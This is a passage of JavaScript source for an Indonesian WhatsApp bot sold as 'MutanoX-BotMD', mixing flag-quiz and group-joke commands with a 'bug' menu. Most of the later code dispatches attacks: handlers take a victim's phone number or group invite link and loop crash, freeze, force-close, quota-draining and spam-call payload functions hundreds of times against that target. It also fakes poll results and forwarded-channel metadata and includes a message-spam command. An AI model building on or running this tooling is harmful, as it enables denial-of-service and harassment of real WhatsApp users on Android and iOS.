{flag:"🇵🇱", jawab:["poland","polandia"]},
{flag:"🇵🇹", jawab:["portugal"]},
{flag:"🇶🇦", jawab:["qatar"]},
{flag:"🇷🇴", jawab:["romania"]},
{flag:"🇷🇺", jawab:["russia","rusia"]},
{flag:"🇸🇦", jawab:["saudi","arab saudi"]},
{flag:"🇷🇸", jawab:["serbia"]},
{flag:"🇸🇬", jawab:["singapore","singapura"]},
{flag:"🇸🇰", jawab:["slovakia"]},
{flag:"🇸🇮", jawab:["slovenia"]},
{flag:"🇿🇦", jawab:["south africa","afrika selatan"]},
{flag:"🇪🇸", jawab:["spain","spanyol"]},
{flag:"🇱🇰", jawab:["sri lanka"]},
{flag:"🇸🇪", jawab:["sweden","swedia"]},
{flag:"🇨🇭", jawab:["switzerland","swiss"]},
{flag:"🇸🇾", jawab:["syria"]},
{flag:"🇹🇼", jawab:["taiwan"]},
{flag:"🇹🇭", jawab:["thailand"]},
{flag:"🇹🇷", jawab:["turkey","turki"]},
{flag:"🇺🇦", jawab:["ukraine"]},
{flag:"🇦🇪", jawab:["uae","uni emirat arab"]},
{flag:"🇬🇧", jawab:["uk","united kingdom","inggris"]},
{flag:"🇺🇸", jawab:["usa","amerika","united states"]},
{flag:"🇺🇾", jawab:["uruguay"]},
{flag:"🇻🇪", jawab:["venezuela"]},
{flag:"🇻🇳", jawab:["vietnam"]},
{flag:"🇾🇪", jawab:["yemen"]},
{flag:"🇿🇲", jawab:["zambia"]},
{flag:"🇿🇼", jawab:["zimbabwe"]}
]

let random = data[Math.floor(Math.random() * data.length)]

let soal = await conn.sendMessage(m.chat,{
text:`🌍 *TEBAK BENDERA*

Negara apa ini?

${random.flag}

Reply pesan ini untuk menjawab 😏`
},{quoted:m})

conn.tebakbendera[soal.key.id] = random.jawab

setTimeout(() => {

if (conn.tebakbendera[soal.key.id]) {

tebak(`😂 Ga ada yang bisa jawab?

Jawaban nya : *${random.jawab[0]}*`)

delete conn.tebakbendera[soal.key.id]

}

},30000)

}
break
case 'tqto': {
  let koko = `
╭━━〔 SUPPORT KELPIN 〕━━⬣
┃ 
┃ SPECIAL FRIEND
┃ • Ryu < Friend >
┃ • Depayy < My Friend >
┃ • Asepp < My Friend >
┃ • Cecep < My Friend >
┃ • Vike < My Friend >
┃ • PapaQueennn < My Friend >
┃ • Lyy < My Friend >
┃ • Setto < My Friend >
┃ • Sena < My Friend >
┃ • Andre < My Friend >
┃
┃ SUPPORT TEAM
┃ • Sena < Friend >
┃ • Allbuyer < Support >
┃ • all staf < My Support >
┃ • AllTitle < My Support >
┃ • AllFriend < My Support >
┃ • AllUser / Buyer < My Support >
┃ • Resseler < Support >
╰━━━━━━━━━━━━━━━━━━⬣

> terimakasih untuk semua yang teman" saya yang tertera maupun tidak tertera, bagi saya kalian adalah support saya`

  // kirim gambar
await conn.sendMessage(m.chat, {
    interactiveMessage: {
        title: koko,
        footer: "> \`𝐛𝐲: 𝐤𝐞𝐥𝐩𝐢𝐧 𝐠𝐯\`",
        thumbnail: "https://img2.pixhost.to/images/7529/720173957_kelpinn.jpg",
        nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
                limited_time_offer: {
                    text: "[ MY SUPPORT ]",
                    url: "https://wa.me/6283192054753",
                    copy_code: "support kelpin",
                    expiration_time: Date.now() * 999
                }
            }),
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Contact Developer",
                        id: `${prefix}owner`
                    })
                }
            ]
        }
    }
}, { quoted: qtoko })
await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/tq.mp3'),
    mimetype: 'audio/mp4',
    ptt: true
  }, { quoted: m })
}
break
case 'developer': {
  let dev = `👨‍💻Script ini dikembangkan oleh kelpin, seorang pembelajar coding asal Jawa Tengah yang berfokus pada pengembangan bot WhatsApp dengan berbagai fitur..`

  // kirim gambar
  await conn.sendMessage(m.chat, {
    interactiveMessage: {
        title: dev,
        footer: "> \`ᴄʀᴇᴀᴛᴇᴅ 𝐛𝐲: 𝐤𝐞𝐥𝐩𝐢𝐧 𝐠𝐯\`",
        thumbnail: "https://img2.pixhost.to/images/7474/719269241_jmjrkhw7f3.jpg",
        nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
                limited_time_offer: {
                    text: "Tiktok @4kelvinss",
                    url: "https://wa.me/6283192054753",
                    copy_code: "Kelpin Gv",
                    expiration_time: Date.now() * 999
                }
            }),
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "CONTACT DEVELOPER",
                        id: `${prefix}owner`
                    })
                }
            ]
        }
    }
}, { quoted: seto })

  // kirim voice note / musik
  await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/dev.mp3'),
    mimetype: 'audio/mp4',
    ptt: true
  }, { quoted: m })
}
case "oi": {
let msg = generateWAMessageFromContent(m.chat, {
pollResultSnapshotMessage: {
name: "📊 *𝗣𝗢𝗟𝗟𝗜𝗡𝗚 𝗞𝗘𝗟𝗣𝗜𝗡*",
pollVotes: [
{
optionName: "Kelpin Ganteng",
optionVoteCount: "19999"
},
{
optionName: "Kelpin Biasa Aja",
optionVoteCount: "10"
},
{
optionName: "Kelpin Jelek",
optionVoteCount: "1"
}
],
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Whatsapp • Kelpin GV",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
}
}
}, {})
conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

}
break
case "polling":
case "custompolling": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply("contoh:\n.polling agus|jelek 100|ganteng 0")

let parts = text.split("|").map(v => v.trim())

let title = parts.shift() // judul polling
let pollVotes = []

for (let p of parts) {
let data = p.split(" ")
let vote = data.pop()
let name = data.join(" ")

pollVotes.push({
optionName: name,
optionVoteCount: vote
})
}

let msg = generateWAMessageFromContent(m.chat, {
pollResultSnapshotMessage: {
name: `📊 *POLLING ${title.toUpperCase()}*`,
pollVotes,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Whatsapp",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
}
}
}, {})

conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
case "sc":
case "buysc":{
    let buy = `-- 💸 *Script For Sale*
───────────────────
\`HARGA SC : 35k\`
───────────────────
彡 Name SC : MutanoX-BotMD
彡 Version SC : *1.0.0*
彡 Feature : MD&BUG
彡 Main : Whatsapp

*Contact Developer:*
彡 *https://wa.me//6283192054753*
彡 *https://t.me/hope6166*
彡 *https://t.me/hope6166*
> semua informasi script bisa hubungi contact diatas

───────────────────
`
    await conn.sendMessage(m.chat, {
    interactiveMessage: {
        title: buy,
        footer: "> \`ᴄʀᴇᴀᴛᴇᴅ 𝐛𝐲: 𝐤𝐞𝐥𝐩𝐢𝐧 𝐠𝐯\`",
        thumbnail: "https://img2.pixhost.to/images/7473/719257792_settomodders.jpg",
        nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
                limited_time_offer: {
                    text: "MutanoX-BotMD V10.0.0",
                    url: "https://wa.me/6283192054753",
                    copy_code: "35.000 IDR",
                    expiration_time: Date.now() * 999
                }
            }),
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "HUBUNGI DEVELOPER",
                        id: `${prefix}owner`
                    })
                }
            ]
        }
    }
}, { quoted: lol })
await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/buy.mp3'),
    mimetype: 'audio/mp4',
    ptt: true
}, { quoted: qtoko })
}
break
case "bug":
case "bugmenu":{
    let bug = `*${greeting()}* ${pushname}, perkenalkan saya adalah bot Whatsapp yang diciptakan oleh *kelpin*, bertujuan untuk membantu anda

╭┈ ˚ ·
│┃꒰ 𖢷 *Name Bot  » MutanoX-BotMD*
│┃꒰ 𖢷 *Developer* » *Kelpin Gv*
│┃꒰ 𖢷 *Version  »  V10.0.0*
│┃꒰ 𖢷 *Language » JavaScript*
│┃꒰ 𖢷 *RunTime   »  ${runtime(process.uptime())}*
│┃꒰ 𖢷 *Feature  » Multy&Bug*
│┃꒰ 𖢷 *StatusScript  » buyVip/buyer*
╰——————・・・・————・・・

╭┈ ˚ ·  ━  *｢ \`ATTACT ANTI KENON\` ｣*
│┃꒰ 𖢷.*Forclose*
│°forclose invisible new>
│┃꒰ 𖢷.*forclose-delay*
│°forclose and delay invis>
│┃꒰ 𖢷.*Forclose1msg*
│°forclose invisible new>
│┃꒰ 𖢷.*Sedot-internal*
│°efek: sedot internal x delay>
│┃꒰ 𖢷.*Delaybebasspam*
│°efek: sedot kuota x delay>
│┃꒰ 𖢷.*Delayautoc1*
│°efek: delayhard x crash>
│┃꒰ 𖢷.*Delayinvishard*
│°efek: delay hard no jejak>
╰——————・・・・————・・・

╭┈ ˚ ·   ━  *｢ \`RECOMMEND BUG\` ｣* 
│┃꒰ 𖢷.*Forcloseclick*
│°efek: forclose ios invis>
│┃꒰ 𖢷.*Crashios*
│°efek: crash ios click>
│┃꒰ 𖢷.*Blankclick*
│°efek: blank in place click>
│┃꒰ 𖢷.*Sedotkuota*
│°efek: sedot kuota no jejak>
│┃꒰ 𖢷.*Crashui*
│°efek: blank and crash>
│┃꒰ 𖢷.*Delayhard*
│°efek: delay hard new>
│┃꒰ 𖢷.*Blanknotif*
│°efek: blank not all device>
│┃꒰ 𖢷.*Spamcallvideo*
│°efek: spam telepon crash>
╰——————・・・・————・・・

╭┈ ˚ ·  ━ *｢ \`BUG GROUP\` ｣* 
┃ *[ketik command di dlm grub]*
│┃꒰ 𖢷.*Ui-group2*
│°efek: delay x blank group>
│┃꒰ 𖢷.*Freeze-group*
│°efek: bug freeze group>
│┃꒰ 𖢷.*Delay-group*
│°efek: delay in group>
┃ \`USE URL/LINK GC\`
│┃꒰ 𖢷.*Ui-Group*
│°efek: bug freeze x delay group>
╰——————・・・・————・・・

╭┈ ˚ ·  ━  *｢ \`BUG CHANNEL\` ｣* 
┃ *[harus admin saluran]*
│┃꒰ 𖢷.*Fcsaluran*
│°ketik didlm saluran whatsApp>
╰——————・・・・————・・・

╭┈ ˚ ·  ━  *｢ \`BUG NUMBER\` ｣* 
┃ \`IOS KILL\`
│┃꒰ 𖢷.*ForcloseIos*
│°efek: forclose ios invis>
│┃꒰ 𖢷.*Crashios*
│°efek: crash ios click>
│┃꒰ 𖢷.*Freezeios*
│°efek: crash click ios>
│° \`ANDROID KILL\`
│┃꒰ 𖢷.*Spamcallbiasa*
│°efek: crash all whatsApp> 
│┃꒰ 𖢷.*Spamcallvideo*
│°efek: blank x delay>
│┃꒰ 𖢷.*spairing*
│°efek: spam notifikasi>
│┃꒰ 𖢷.*Crashbeta*
│°efek: forclose and crash>
│┃꒰ 𖢷.*Delayinvis*
│°efek: invis no tag sw>
│┃꒰ 𖢷.*Delayhard*
│°efek: delay hard new>
│┃꒰ 𖢷.*Blanknew*
│°efek: blank x delay>
│┃꒰ 𖢷.*Ampas*
│°efek: freezzz click>
│┃꒰ 𖢷.*Delaycombo*
│°efek: delayhard x crash>
╰——————・・・・————・・・

╭┈ ˚ ·  ━  *｢ \`BUG EMOJI\` ｣* 
│┃꒰ 𖢷.*🩸 ex 62882xxxx* 
│┃꒰ 𖢷.*😈 ex 62882xxxx*
│┃꒰ 𖢷.*🤬 ex 62882xxxx*
│┃꒰ 𖢷.*💦 ex 62882xxxx*
│┃꒰ 𖢷.*😝 ex 62882xxxx*
│┃꒰ 𖢷.*🔥 ex 62882xxxx*
╰——————・・・・————・・・
`
const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)]

await conn.sendMessage(m.chat, {
interactiveMessage: {

contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
},

title: bug,

footer: `MutanoX-BotV10`,

thumbnail: randomThumb,

nativeFlowMessage: {

messageParamsJson: JSON.stringify({}),

buttons: [

{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Select Menu",
sections: [
{
title: "\ud83d\udce6 Kategori Fitur",
rows: [
{ header: "All Menu", title: "Lihat semua fitur", id: `${prefix}semua` },
{ header: "Bug Fitur", title: "Fitur bug / attack", id: `${prefix}bugmenu` },
{ header: "Create Panel", title: "Buat panel Pterodactyl", id: `${prefix}cpanel` },
{ header: "Buy Script", title: "Info pembelian script", id: `${prefix}buysc` },
{ header: "Payment Info", title: "Info pembayaran (QRIS)", id: `${prefix}qris` },
{ header: "Back to Menu", title: "Kembali ke menu utama", id: `${prefix}menu` }
]
}
]
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Contact Developer",
url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Back Menu",
id: `${prefix}menu`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Fitur",
id: `${prefix}allmenu`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Buy Script",
id: `${prefix}buysc`
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Saluran Developer",
url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
})
}
    
]
}
}
}, { quoted: lol })
}
break

case "ambil": {
if (!m.quoted) return Reply("Reply pesan yang ingin diambil")

let msg = m.quoted.message

await conn.relayMessage(m.chat, msg, {
messageId: conn.generateMessageTag()
})
}
break
case "member": {
if (!m.isGroup) return Reply("Khusus grup")

let metadata = await conn.groupMetadata(m.chat)
let participants = metadata.participants

let total = participants.length

Reply(`Total Member Grup : ${total}`)
}
break
case "infogc": {
if (!m.isGroup) return Reply("Khusus grup")

let metadata = await conn.groupMetadata(m.chat)

Reply(`Info Grup :

Nama : ${metadata.subject}
ID : ${metadata.id}
Member : ${metadata.participants.length}
Owner : ${metadata.owner}`)
}
break
case "couple": {
if (!m.isGroup) return Reply("Khusus grup")

let metadata = await conn.groupMetadata(m.chat)
let participants = metadata.participants
.filter(v => v.id !== conn.user.id)

let member1 = participants[Math.floor(Math.random() * participants.length)].id
let member2

do {
member2 = participants[Math.floor(Math.random() * participants.length)].id
} while (member1 === member2)

await conn.sendMessage(m.chat,{
text:`💞 *Couple Hari Ini*

@${member1.split("@")[0]} ❤️ @${member2.split("@")[0]}

Ciee cocok banget 😳`,
mentions:[member1,member2]
},{quoted:m})
}
break
case "roastmem": {
if (!m.isGroup) return Reply("Khusus grup")

let metadata = await conn.groupMetadata(m.chat)
let participants = metadata.participants

let member = participants[Math.floor(Math.random() * participants.length)].id

let roast = [
"Kalau malas itu olahraga, orang ini sudah atlet nasional.",
"Kalau otak dijual, mungkin masih segel dari pabrik.",
"Mukanya cocok jadi before iklan skincare.",
"Kalau jadi WiFi, sinyalnya cuma satu bar.",
"Orang ini kalau lomba tidur pasti juara dunia.",
"Kalau jadi Google pasti error 404.",
"Dia bukan jelek, cuma versi beta manusia.",
"Kalau jadi sinetron pasti judulnya 'Indahnya Kesabaran'.",
"Orang ini kalau jadi alarm pasti di-snooze terus.",
"Kalau jadi aplikasi pasti sering force close.",
"Dia ini bukannya bodoh, cuma lagi hemat mikir.",
"Kalau hidup itu game, dia masih di tutorial.",
"Orang ini kalau main petak umpet pasti dicari karena kasihan.",
"Kalau jadi charger pasti longgar.",
"Dia bukan lambat, cuma loading lama."
]

let hasil = roast[Math.floor(Math.random() * roast.length)]

await conn.sendMessage(m.chat,{
text:`🔥 Roast Member

@${member.split("@")[0]}

${hasil}`,
mentions:[member]
},{quoted:m})
}
break
case "beban": {
if (!m.isGroup) return Reply("Khusus grup")
let metadata = await conn.groupMetadata(m.chat)
let participants = metadata.participants

let member = participants[Math.floor(Math.random() * participants.length)].id

await conn.sendMessage(m.chat,{
text:`📢 Beban Grup Hari Ini

@${member.split("@")[0]} 😭
yah kasian jadi beban grub`,
mentions:[member]
},{quoted: m})
}
break
case "send": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply("Fitur ini hanya untuk grup")
if (!m.quoted) return Reply("Reply pesan yang ingin dispam\nContoh .send 10")
if (!text) return Reply("Contoh : .send 10")

let jumlah = parseInt(text)
if (isNaN(jumlah)) return Reply("Masukkan angka")
if (jumlah > 20) return Reply("Max spam 20")

let msg = m.quoted.message

for (let i = 0; i < jumlah; i++) {
await conn.relayMessage(m.chat, msg, {})
}

}
break
case "totalgc": {
if (!isCreator) return Reply(mess.owner)

let groups = await conn.groupFetchAllParticipating()
let total = Object.keys(groups).length

Reply(`Total Grup Bot : ${total}`)
}
break
case "idgrup": {
if (!m.isGroup) return Reply("Fitur ini hanya untuk grup")

let id = m.chat

let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {

header: {
title: "ID GROUP",
hasMediaAttachment: false
},

body: {
text: `ID Grup : ${id}`
},

footer: {
text: "`created by: kelpin gv`"
},

nativeFlowMessage: {
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy ID",
copy_code: id
})
}
]
}

}
}
}
}, { quoted: m })
await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break
case "getlinkgc":
case "linkgroup": {
if (mess.owner) {
if (!isCreator && !isPremium) return Reply(mess.owner)

try {
let link = await conn.groupInviteCode(m.chat)
Reply(`Link Grup :

https://chat.whatsapp.com/${link}`)
} catch {
Reply("Bot harus menjadi admin untuk mengambil link grup")
}

} else {
if (!isCreator) return Reply(mess.owner)

try {
let link = await conn.groupInviteCode(m.chat)
Reply(`Link Grup :

https://chat.whatsapp.com/${link}`)
} catch {
Reply("Bot harus menjadi admin untuk mengambil link grup")
}

}
}
break
case "onlygc": {
if (!isCreator) return Reply(mess.owner)

let mode = args[0]

if (mode === "on") {
onlygc = true
Reply("✅ Only group diaktifkan")
} else if (mode === "off") {
onlygc = false
Reply("❌ Only group dimatikan")
} else {
Reply("Contoh:\n.onlygc on\n.onlygc off")
}

}
break
              
//~~~~~~~~~~~~~ ALL COMAND ~~~~~~~~~~~~~~~~~//

            case 'delayinvis': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                   await Delayinvis(target);
                   await Delayinvisv2(target); 
                   await sleep(200);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;

            case 'blankclick':
            case 'crash-andro': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 5; i++) {
                   await FreezeCrash(target);
                   await FreezeCrash(target); 
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'forclose-delay':
            case 'protocolbug': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 200; i++) {
                   await fcv2(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'iphonekill':
            case 'freezeios': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                   await NanBlankIphone(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
                        case 'delayinvishard': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 90; i++) {
                   await Truenullv4(conn, target);
                   await Truenullv4(conn, target);
                   await Truenullv4(conn, target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
                        case 'spamcallbiasa':
            case 'for': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 90; i++) {
                   await InvisibleCall(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'ui-group2': {
        if (!isCreator) return Reply(mess.owner)
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        for (let i = 0; i < 50; i++) {
            await UIGroupKontol(m.chat);
        }
    }
    break;
case 'ui-group': {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return Reply(`Example: ${prefix + command} https://chat.whatsapp.com/ABCDEFG12345`);

    if (!q.includes('chat.whatsapp.com')) {
        return Reply("❌ Masukkan link grup WhatsApp yang valid.");
    }

    let inviteCode = q.split('chat.whatsapp.com/')[1].split('?')[0].split('/')[0].trim();
    
    let targetgroup = await conn.groupAcceptInvite(inviteCode);
    
    await Reply("Sukses Attacks Group By Setyo");
    
    for (let i = 0; i < 50; i++) {
        await UIGroupKontol(targetgroup);
    }
}
break;
 case 'delayautoc1': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! sent delay invisible to ${target}`);
                
                 for (let i = 0; i < 10; i++) {
                   await CombinedExploit(target); 
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
case 'delaycombo': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 900; i++) {
                   await SettoDelaycombo(target);
                   await SettoDelaycombo(target);
                   await SettoDelaycombo(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'sedot-internal': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                   await ArsyilOfficialForceInvisble(conn, target);
                   await ArsyilOfficialForceInvisble(conn, target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'forcloseios': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 50; i++) {
                   await ForceIphoneInvisible(target);
                   await ForceIphoneInvisible(target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'forclose1msg': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 1; i++) {
                   await ForcloseOneMSGV2(conn, target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
            case 'forclose': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 300; i++) {
                   await xCursedFC(conn, target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
case "con1":
case "con2":
case "con3":
case "con4": {
    try {
        if (!isCreator) return Reply(mess.owner);

        let text = m.message?.conversation 
            || m.message?.extendedTextMessage?.text 
            || m.message?.buttonsResponseMessage?.selectedButtonId 
            || m.message?.listResponseMessage?.singleSelectReply?.selectedRowId 
            || "";

        let args = text.split(" ");
        let jidx = args[1];

        if (!jidx) return Reply("❌ Target tidak ditemukan!");

        jidx = jidx.replace(/[^0-9]/g, "");
        let target = `${jidx}@s.whatsapp.net`;

        Reply(`✅ Menjalankan ${command.toUpperCase()} ke ${target}`);

        for (let i = 0; i < 50; i++) {
            await ArsyilSedotMemeg(conn, target);
        }

        console.log(chalk.red.bold(`Success ${command} → ${target}`));

    } catch (e) {
        console.error(`Error ${command}:`, e);
        Reply("❌ Error");
    }
}
break;
            case 'delaybebasspam':
            case 'sedotkuota': {
                if (!isCreator) return Reply(mess.owner)
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);
                
                 for (let i = 0; i < 500; i++) {
                   await ArsyilSedotMemeg(conn, target);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
                case '😝':
                case '🔥':
                case '💦':
                case '🤬':
                case '😈':
                case '🩸': {
                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                await sleep(3500);
                await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
                if (!isCreator) return Reply(mess.owner)
                
                const args = m.text.split(' ').slice(1);
                const q = args[0] || '';
                if (!q) return KataAudio(`— contoh: ${prefix + command} 62`);
    
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return KataAudio(`— contoh: ${prefix + command} 62 !!`);
                if (jidx.length < 10) return Reply(`nomor tidak valid!`);
    
                let target = `${jidx}@s.whatsapp.net`;
                Reply(`success! send bug to ${target}\n\n\`ᴛᴏʟᴏɴɢ ᴊᴇᴅᴀ 5ᴍᴇɴɪᴛ sᴇᴛᴇʟᴀʜ ɴɢᴇʙᴜɢ\``);             
